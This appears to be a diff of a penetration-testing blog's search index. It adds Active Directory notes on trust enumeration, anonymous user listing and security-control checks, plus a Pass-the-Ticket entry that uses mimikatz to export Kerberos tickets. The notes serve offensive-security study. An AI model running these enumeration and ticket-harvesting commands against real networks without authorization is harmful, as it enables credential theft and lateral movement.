@@ -914,7 +914,59 @@
   <entry>
     <title>Child-Parent Trust Enumeration</title>
     <url>/2026/07/06/Child-Parent-Trust-Enumeration/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<blockquote>
+<p>➜ Before attacking a trust, first confirm it exists and learn its type (parent&#x2F;child, external, forest) and direction (one-way or bidirectional).</p>
+</blockquote>
+<h2 id="Checking-For-Existing-Trusts"><a href="#Checking-For-Existing-Trusts" class="headerlink" title="Checking For Existing Trusts"></a>Checking For Existing Trusts</h2><h4 id="AD-Module-Get-ADTrust"><a href="#AD-Module-Get-ADTrust" class="headerlink" title="AD Module : Get-ADTrust"></a>AD Module : Get-ADTrust</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Direction               : BiDirectional</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustAttributes         : 32</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustAttributes         : 8</span><br><span class="line">TrustType               : Uplevel</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ If <code>SIDFilteringForestAware</code>&#x2F;<code>SIDFilteringQuarantined</code> are both <code>False</code>, SID filtering isn’t enforced — the trust may be vulnerable to an ExtraSids attack (SID History abuse).</p>
+</blockquote>
+<h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><blockquote>
+<p>➜ Same information, PowerView’s own format.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"><span class="built_in">Get-DomainTrust</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line"></span><br><span class="line">SourceName      : INLANEFREIGHT.LOCAL</span><br><span class="line">TargetName      : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TrustAttributes : FOREST_TRANSITIVE</span><br><span class="line">TrustDirection  : Bidirectional</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ <code>Get-DomainTrustMapping</code> walks every reachable domain and maps trusts recursively, revealing type (parent&#x2F;child, external, forest) and direction in one pass.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainTrustMapping</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><blockquote>
+<p>➜ The <code>Map Domain Trusts</code> pre-built query visualizes every trust relationship and its direction at a glance.</p>
+</blockquote>
+<h2 id="Enumerating-Without-PowerView-LOTL"><a href="#Enumerating-Without-PowerView-LOTL" class="headerlink" title="Enumerating Without PowerView (LOTL)"></a>Enumerating Without PowerView (LOTL)</h2><h4 id="netdom"><a href="#netdom" class="headerlink" title="netdom"></a>netdom</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netdom query /domain:&lt;DOMAIN&gt; trust</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Direction Trusted\Trusting domain                         Trust type</span><br><span class="line">========= =======================                         ==========</span><br><span class="line">&lt;-&gt;       LOGISTICS.INLANEFREIGHT.LOCAL                    Direct</span><br><span class="line">&lt;-&gt;       FREIGHTLOGISTICS.LOCAL                            Direct</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ List the domain controllers of a (child&#x2F;trusted) domain.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netdom query /domain:&lt;DOMAIN&gt; dc</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ List workstations and servers joined to a (child&#x2F;trusted) domain.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netdom query /domain:&lt;DOMAIN&gt; workstation</span><br></pre></td></tr></table></figure>
+
+<h4 id="nltest"><a href="#nltest" class="headerlink" title="nltest"></a>nltest</h4><blockquote>
+<p>➜ List every trust the current domain has, including transitive ones.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts</span><br></pre></td></tr></table></figure>
+
+<h4 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h4><blockquote>
+<p>➜ Show the current domain, its forest, and any trusted domain in one line each — no credentials required beyond a domain session.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Caption          Description      DnsForestName           DomainControllerAddress  DomainName</span><br><span class="line">INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT</span><br><span class="line">LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS</span><br><span class="line">FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Exploitation</category>
@@ -1962,49 +2014,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Forest Trust Enumeration</title>
-    <url>/2026/07/06/Forest-Trust-Enumeration/</url>
-    <content><![CDATA[<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Return the trust relationships of the current forest.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Return users from another domain who are members of groups in ours.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainForeignUser</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Return principals from other domains placed into groups in this domain (cross-trust access).</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainForeignGroupMember</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Exploitation</category>
-        <category>Enumeration</category>
-        <category>Forest Trust Enumeration</category>
-      </categories>
-      <tags>
-        <tag>PowerView</tag>
-        <tag>Forest-Trusts</tag>
-        <tag>Cross-Forest</tag>
-        <tag>Cross-Domain</tag>
-        <tag>Get-DomainForeignGroupMember</tag>
-        <tag>Windows</tag>
-        <tag>Active-Directory</tag>
-        <tag>Domain-Trusts</tag>
-        <tag>Trust-Enumeration</tag>
-        <tag>Foreign-Security-Principals</tag>
-        <tag>Foreign-Users</tag>
-        <tag>Foreign-Group-Members</tag>
-        <tag>Get-ForestTrust</tag>
-        <tag>Get-DomainForeignUser</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Host Discovery</title>
     <url>/2026/07/04/Host-Discovery/</url>
     <content><![CDATA[<h2 id="Passive"><a href="#Passive" class="headerlink" title="Passive"></a>Passive</h2><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><blockquote>
@@ -2089,6 +2098,49 @@
         <tag>Nmap</tag>
         <tag>ICMP</tag>
         <tag>Ping-Sweep</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Forest Trust Enumeration</title>
+    <url>/2026/07/06/Forest-Trust-Enumeration/</url>
+    <content><![CDATA[<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Return the trust relationships of the current forest.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Return users from another domain who are members of groups in ours.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainForeignUser</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Return principals from other domains placed into groups in this domain (cross-trust access).</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-DomainForeignGroupMember</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Exploitation</category>
+        <category>Enumeration</category>
+        <category>Forest Trust Enumeration</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Forest-Trusts</tag>
+        <tag>Cross-Forest</tag>
+        <tag>Cross-Domain</tag>
+        <tag>Get-DomainForeignGroupMember</tag>
+        <tag>Windows</tag>
+        <tag>Active-Directory</tag>
+        <tag>Domain-Trusts</tag>
+        <tag>Trust-Enumeration</tag>
+        <tag>Foreign-Security-Principals</tag>
+        <tag>Foreign-Users</tag>
+        <tag>Foreign-Group-Members</tag>
+        <tag>Get-ForestTrust</tag>
+        <tag>Get-DomainForeignUser</tag>
       </tags>
   </entry>
   <entry>
@@ -2615,6 +2667,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Making a Target User List</title>
+    <url>/2025/12/03/Making-a-Target-User-List/</url>
+    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Making a Target User List</category>
+      </categories>
+      <tags>
+        <tag>netexec</tag>
+        <tag>windapsearch</tag>
+        <tag>rpcclient</tag>
+        <tag>ldapsearch</tag>
+        <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Modifiable Registry Autorun &amp; Startup Binary</title>
     <url>/2026/06/19/Modifiable-Registry-Autorun-Startup-Binary/</url>
     <content><![CDATA[<blockquote>
@@ -2684,42 +2772,6 @@
         <tag>Weak-ACL</tag>
         <tag>AccessChk</tag>
         <tag>icacls</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Making a Target User List</title>
-    <url>/2025/12/03/Making-a-Target-User-List/</url>
-    <content><![CDATA[<h2 id="SMB-NULL-Session"><a href="#SMB-NULL-Session" class="headerlink" title="SMB NULL Session"></a>SMB NULL Session</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc dc-ip -d Domain wordlist.txt</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">enum4linux -U dc-ip  | grep <span class="string">&quot;user:&quot;</span> | <span class="built_in">cut</span> -f2 -d<span class="string">&quot;[&quot;</span> | <span class="built_in">cut</span> -f1 -d<span class="string">&quot;]&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpcclient -U <span class="string">&quot;&quot;</span> -N dc-ip</span><br><span class="line"></span><br><span class="line">rpcclient&gt; enumdomusers </span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
-
-
-<h2 id="LDAP-Anonymous"><a href="#LDAP-Anonymous" class="headerlink" title="LDAP Anonymous"></a>LDAP Anonymous</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Get Base DN  </span></span><br><span class="line">  </span><br><span class="line">ldapsearch -x -H ldap://&lt;DC_IP&gt; -s base namingcontexts  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># Step 2: Use Base DN to retrieve list of users</span></span><br><span class="line"></span><br><span class="line">ldapsearch -h dc-ip -x -b <span class="string">&quot;&lt;BASE_DN&gt;&quot;</span> -s sub <span class="string">&quot;(&amp;(objectclass=user))&quot;</span>  | grep sAMAccountName: | <span class="built_in">cut</span> -f2 -d<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./windapsearch.py --dc-ip &lt;DC_IP&gt; -u <span class="string">&quot;&quot;</span> -U</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Enumeration</category>
-        <category>Users &amp; Passwords Enumeration</category>
-        <category>Making a Target User List</category>
-      </categories>
-      <tags>
-        <tag>netexec</tag>
-        <tag>windapsearch</tag>
-        <tag>rpcclient</tag>
-        <tag>ldapsearch</tag>
-        <tag>enum4linux-ng</tag>
       </tags>
   </entry>
   <entry>
@@ -4564,73 +4616,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Security Controls</title>
-    <url>/2026/07/04/Security-Controls/</url>
-    <content><![CDATA[<h3 id="Windows-Defender-Status"><a href="#Windows-Defender-Status" class="headerlink" title="Windows Defender Status"></a>Windows Defender Status</h3><blockquote>
-<p>➜ Check whether Defender and real-time protection are enabled.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-MpComputerStatus</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="AppLocker-Policy"><a href="#AppLocker-Policy" class="headerlink" title="AppLocker Policy"></a>AppLocker Policy</h3><blockquote>
-<p>➜ Review the effective AppLocker rules to see what binaries are blocked.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerShell-Language-Mode"><a href="#PowerShell-Language-Mode" class="headerlink" title="PowerShell Language Mode"></a>PowerShell Language Mode</h3><blockquote>
-<p>➜ Check the language mode : <code>ConstrainedLanguage restricts most offensive tools</code></p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>
-
-<h3 id="LAPS-Delegated-Groups"><a href="#LAPS-Delegated-Groups" class="headerlink" title="LAPS - Delegated Groups"></a>LAPS - Delegated Groups</h3><blockquote>
-<p>➜ Find groups delegated rights to read LAPS passwords.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Find-LAPSDelegatedGroups</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="LAPS-Extended-Rights"><a href="#LAPS-Extended-Rights" class="headerlink" title="LAPS - Extended Rights"></a>LAPS - Extended Rights</h3><blockquote>
-<p>➜ Find principals with extended rights to read LAPS passwords.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Find-AdmPwdExtendedRights</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="LAPS-Readable-Computers"><a href="#LAPS-Readable-Computers" class="headerlink" title="LAPS - Readable Computers"></a>LAPS - Readable Computers</h3><blockquote>
-<p>➜ List computers whose LAPS password the current user can read.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-LAPSComputers</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Living-Off-the-Land-Built-in-Checks"><a href="#Living-Off-the-Land-Built-in-Checks" class="headerlink" title="Living Off the Land - Built-in Checks"></a>Living Off the Land - Built-in Checks</h2><h3 id="Windows-Firewall-Profiles"><a href="#Windows-Firewall-Profiles" class="headerlink" title="Windows Firewall Profiles"></a>Windows Firewall Profiles</h3><blockquote>
-<p>➜ Shows whether the firewall is turned <strong>on or off</strong> for each profile (Domain, Private, Public) and its default inbound&#x2F;outbound rules.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerShell-Execution-Policy"><a href="#PowerShell-Execution-Policy" class="headerlink" title="PowerShell Execution Policy"></a>PowerShell Execution Policy</h3><blockquote>
-<p>➜ Check the execution policy across all scopes.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span> <span class="literal">-List</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Exploitation</category>
-        <category>Enumeration</category>
-        <category>Security Controls</category>
-      </categories>
-      <tags>
-        <tag>PowerView</tag>
-        <tag>Windows</tag>
-        <tag>Active-Directory</tag>
-        <tag>Living-Off-The-Land</tag>
-        <tag>LAPS</tag>
-        <tag>Microsoft-Defender</tag>
-        <tag>AppLocker</tag>
-        <tag>Security-Controls</tag>
-        <tag>LOLBAS</tag>
-        <tag>Constrained-Language-Mode</tag>
-        <tag>Execution-Policy</tag>
-        <tag>Windows-Firewall</tag>
-        <tag>Defensive-Enumeration</tag>
-        <tag>Environment-Enumeration</tag>
-        <tag>Post-Exploitation</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Server Operators</title>
     <url>/2026/03/06/Server-Operators/</url>
     <content><![CDATA[<blockquote>
@@ -4755,6 +4740,73 @@
         <tag>Get-DomainFileServer</tag>
         <tag>DFS</tag>
         <tag>Get-DomainDFSShare</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Security Controls</title>
+    <url>/2026/07/04/Security-Controls/</url>
+    <content><![CDATA[<h3 id="Windows-Defender-Status"><a href="#Windows-Defender-Status" class="headerlink" title="Windows Defender Status"></a>Windows Defender Status</h3><blockquote>
+<p>➜ Check whether Defender and real-time protection are enabled.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-MpComputerStatus</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="AppLocker-Policy"><a href="#AppLocker-Policy" class="headerlink" title="AppLocker Policy"></a>AppLocker Policy</h3><blockquote>
+<p>➜ Review the effective AppLocker rules to see what binaries are blocked.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell-Language-Mode"><a href="#PowerShell-Language-Mode" class="headerlink" title="PowerShell Language Mode"></a>PowerShell Language Mode</h3><blockquote>
+<p>➜ Check the language mode : <code>ConstrainedLanguage restricts most offensive tools</code></p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>
+
+<h3 id="LAPS-Delegated-Groups"><a href="#LAPS-Delegated-Groups" class="headerlink" title="LAPS - Delegated Groups"></a>LAPS - Delegated Groups</h3><blockquote>
+<p>➜ Find groups delegated rights to read LAPS passwords.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Find-LAPSDelegatedGroups</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="LAPS-Extended-Rights"><a href="#LAPS-Extended-Rights" class="headerlink" title="LAPS - Extended Rights"></a>LAPS - Extended Rights</h3><blockquote>
+<p>➜ Find principals with extended rights to read LAPS passwords.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Find-AdmPwdExtendedRights</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="LAPS-Readable-Computers"><a href="#LAPS-Readable-Computers" class="headerlink" title="LAPS - Readable Computers"></a>LAPS - Readable Computers</h3><blockquote>
+<p>➜ List computers whose LAPS password the current user can read.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-LAPSComputers</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Living-Off-the-Land-Built-in-Checks"><a href="#Living-Off-the-Land-Built-in-Checks" class="headerlink" title="Living Off the Land - Built-in Checks"></a>Living Off the Land - Built-in Checks</h2><h3 id="Windows-Firewall-Profiles"><a href="#Windows-Firewall-Profiles" class="headerlink" title="Windows Firewall Profiles"></a>Windows Firewall Profiles</h3><blockquote>
+<p>➜ Shows whether the firewall is turned <strong>on or off</strong> for each profile (Domain, Private, Public) and its default inbound&#x2F;outbound rules.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell-Execution-Policy"><a href="#PowerShell-Execution-Policy" class="headerlink" title="PowerShell Execution Policy"></a>PowerShell Execution Policy</h3><blockquote>
+<p>➜ Check the execution policy across all scopes.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span> <span class="literal">-List</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Exploitation</category>
+        <category>Enumeration</category>
+        <category>Security Controls</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Windows</tag>
+        <tag>Active-Directory</tag>
+        <tag>Living-Off-The-Land</tag>
+        <tag>LAPS</tag>
+        <tag>Microsoft-Defender</tag>
+        <tag>AppLocker</tag>
+        <tag>Security-Controls</tag>
+        <tag>LOLBAS</tag>
+        <tag>Constrained-Language-Mode</tag>
+        <tag>Execution-Policy</tag>
+        <tag>Windows-Firewall</tag>
+        <tag>Defensive-Enumeration</tag>
+        <tag>Environment-Enumeration</tag>
+        <tag>Post-Exploitation</tag>
       </tags>
   </entry>
   <entry>
@@ -5510,54 +5562,77 @@
       </tags>
   </entry>
   <entry>
-    <title>Writing Custom Wordlists and Rules</title>
-    <url>/2025/12/04/Writing-Custom-Wordlists-and-Rules/</url>
-    <content><![CDATA[<h1 id="Default-Credential"><a href="#Default-Credential" class="headerlink" title="Default Credential"></a>Default Credential</h1><h3 id="Creds"><a href="#Creds" class="headerlink" title="Creds"></a>Creds</h3><p>Installation </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install defaultcreds-cheat-sheet</span><br></pre></td></tr></table></figure>
-
-<p>Example :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search tomcat</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds search mysql</span><br></pre></td></tr></table></figure>
+    <title>Windows Pass the Ticket (PtT)</title>
+    <url>/2025/11/27/Windows-Pass-the-Ticket-PtT/</url>
+    <content><![CDATA[<h1 id="Harvesting-Kerberos-tickets"><a href="#Harvesting-Kerberos-tickets" class="headerlink" title="Harvesting Kerberos tickets"></a>Harvesting Kerberos tickets</h1><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
+<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::tickets /export</span></span><br><span class="line"></span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi !</span><br><span class="line">* Saved to file [<span class="number">0</span>;<span class="number">5063</span><span class="type">e</span>]<span class="literal">-1-0-40a50000-DC01</span><span class="variable">$</span>@LDAP<span class="literal">-DC01</span>.inlanefreight.htb.kirbi !</span><br><span class="line">  </span><br><span class="line"><span class="built_in">Group</span> <span class="number">2</span> - Ticket Granting Ticket</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h1><blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt; <span class="built_in">dir</span> *.kirbi</span><br><span class="line"></span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1445</span> [<span class="number">0</span>;<span class="number">6</span><span class="type">c680</span>]<span class="literal">-2-0-40e10000-plaintext</span>@krbtgt<span class="literal">-inlanefreight</span>.htb.kirbi</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">7</span>/<span class="number">12</span>/<span class="number">2022</span>   <span class="number">9</span>:<span class="number">44</span> AM           <span class="number">1565</span> [<span class="number">0</span>;<span class="number">3</span><span class="type">e7</span>]<span class="literal">-0-2-40a50000-DC01</span><span class="variable">$</span>@cifs<span class="literal">-DC01</span>.inlanefreight.htb.kirbi</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ The tickets that end with <code>$</code> belong to computer accounts.</p>
+<p>➜ <code>TGT</code> tickets follow this format : <code>[randomvalue]-username@krbtgt-domain.local.kirbi</code>.</p>
+<p>➜ <code>TGS</code> tickets follow this format : <code>[randomvalue]-username@service-domain.local.kirbi</code>.</p>
+<h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>➜ As a <code>non-administrative</code> user we can only get our tickets.</p>
+<p>➜ As a <code>local administrator</code> user we can collect everything.</p>
